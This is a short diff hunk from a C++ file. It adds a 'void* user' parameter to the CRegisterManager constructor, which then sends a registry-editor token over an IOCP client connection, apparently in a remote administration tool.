@@ -11,7 +11,7 @@ using namespace std;
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CRegisterManager::CRegisterManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
+CRegisterManager::CRegisterManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
 {
 	BYTE bToken=TOKEN_REGEDIT;
 	m_ClientObject->OnServerSending((char*)&bToken, 1);  
